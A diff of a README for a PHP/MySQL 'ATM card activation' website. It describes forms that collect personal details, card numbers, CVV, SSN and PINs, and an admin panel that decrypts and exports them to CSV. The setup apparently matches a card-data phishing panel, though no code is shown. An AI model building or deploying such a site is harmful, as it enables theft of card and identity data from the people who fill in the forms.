@@ -330,47 +330,39 @@ A professional, multi-page ATM card activation website built with PHP, HTML5, CS
 - Smooth card reveal animation
 
 ### Page 3: PIN Setup (pin-setup.php)
-- Card details input with automatic formatting
-- Luhn algorithm validation for card numbers
-- PIN strength indicator (weak/medium/strong)
-- PIN visibility toggle
-- Saves all data to database
-- Redirects to pending review page
+- PIN entry form with validation
+- PIN confirmation matching
+- Saves all data to MySQL database
+- Redirects to success page upon completion
 
-### Page 4: Pending Review (pending.php) **NEW**
-- 1-minute loading animation with progress messages
-- Displays pending approval status
-- Shows unique reference ID for tracking
-- Provides information about next steps
-- Professional waiting experience
-
-### Admin Panel (/admin) **NEW**
+### Admin Panel (/admin)
 - **Login Page**: Secure authentication for administrators
-- **Dashboard**: Statistics overview (total, pending, approved, rejected requests)
+- **Dashboard**: Statistics overview (total, pending, active, suspended cards)
 - **Request Management**: View, filter, and manage all activation requests
 - **Detail View**: Complete information for each activation request
-- **Approve/Reject**: One-click actions with optional admin notes
+- **Data Export**: Export activation records to CSV
 - **Session Management**: Secure admin sessions with timeout
 
-### Database Integration **NEW**
-- **SQLite Database**: Lightweight, file-based storage (no MySQL setup needed)
-- **Automatic Setup**: Database and tables created on first run
-- **Secure Storage**: All activation requests stored with encrypted PINs
+### Database Integration
+- **MySQL Database**: Robust, scalable storage
+- **Schema Management**: SQL scripts for easy setup
+- **Secure Storage**: All sensitive data encrypted (SSN, card numbers, CVV)
 - **CRUD Operations**: Full create, read, update functionality
-- **Statistics Tracking**: Real-time counts of requests by status
+- **Statistics Tracking**: Real-time counts of activations by status
 
 ## Technology Stack
 
-- **Backend**: PHP 8.3+
-- **Database**: SQLite 3
+- **Backend**: PHP 7.4+
+- **Database**: MySQL 5.7+
 - **Frontend**: HTML5, CSS3, Vanilla JavaScript
 - **Session Management**: PHP Sessions
-- **Security**: Input sanitization, password hashing, Luhn validation, SQL injection prevention
+- **Security**: AES-256-CBC encryption, bcrypt password hashing, prepared statements, CSRF protection
 
 ## Installation & Usage
 
 ### Prerequisites
-- PHP 8.0 or higher (with SQLite extension)
+- PHP 7.4 or higher
+- MySQL 5.7 or higher
 - Web server (Apache/Nginx) or use PHP built-in server
 
 ### Quick Start
@@ -381,52 +373,72 @@ git clone https://github.com/mykael2000/worldtrustatm.git
 cd worldtrustatm
 ```
 
-2. Start the PHP development server:
+2. Create and configure the database:
+```bash
+# Create the database and tables
+mysql -u root -p < database/schema.sql
+
+# Insert default admin user
+mysql -u root -p worldtrust_atm < database/seed.sql
+```
+
+3. Configure environment variables:
+```bash
+cp .env.example .env
+# Edit .env with your database credentials
+```
+
+4. Start the PHP development server:
 ```bash
 php -S localhost:8000
 ```
 
-3. Open your browser and navigate to:
+5. Open your browser and navigate to:
 ```
 http://localhost:8000/index.php
 ```
 
-4. Follow the 4-step activation process:
-   - Fill in your details on the first page
-   - View your activated card on the second page
-   - Set up your PIN on the third page
-   - Wait for admin approval (pending review page)
+6. Follow the 3-step activation process:
+   - Fill in your details on page 1
+   - Enter card information on page 2
+   - Set up your PIN on page 3
+   - View success confirmation
 
-5. Access the admin panel:
+7. Access the admin panel:
 ```
-http://localhost:8000/admin
+http://localhost:8000/admin/login.php
 Username: admin
-Password: admin123
+Password: Admin@123
 ```
 
 ## File Structure
 
 ```
 worldtrustatm/
-├── index.php              # Page 1: Basic details form
-├── card-display.php       # Page 2: Card display & loading
-├── pin-setup.php          # Page 3: PIN setup (saves to DB)
-├── pending.php            # Page 4: Pending review page
+├── index.php              # Page 1: Personal & account information
+├── card-display.php       # Page 2: Card details entry
+├── pin-setup.php          # Page 3: PIN setup & database save
+├── success.php            # Success confirmation page
 ├── css/
 │   └── styles.css        # All styles and animations
 ├── js/
 │   ├── form-validation.js    # Form validation logic
-│   ├── card-display.js       # Loading & card animations
-│   ├── pin-setup.js          # PIN setup & card validation
-│   └── pending.js            # Pending page loader
+│   ├── card-display.js       # Card form handling
+│   └── pin-setup.js          # PIN setup validation
 ├── includes/
 │   ├── config.php           # Configuration & constants
-│   ├── functions.php        # Helper functions
-│   └── database.php         # Database operations
+│   ├── functions.php        # Helper functions (encryption, validation)
+│   ├── db.php              # MySQL PDO connection
+│   └── db-config.php       # Database configuration loader
+├── database/
+│   ├── schema.sql          # MySQL database schema
+│   └── seed.sql            # Default admin user
 ├── admin/                   # Admin panel
-│   ├── index.php           # Admin login
-│   ├── dashboard.php       # Admin dashboard
-│   ├── view.php            # View request details
+│   ├── login.php           # Admin login
+│   ├── index.php           # Admin dashboard
+│   ├── activations.php     # View all activations
+│   ├── view.php            # View single activation
+│   ├── decrypt.php         # AJAX decrypt endpoint
 │   └── logout.php          # Admin logout
 ├── database/               # SQLite database (auto-created)
 │   └── activations.db     # Database file
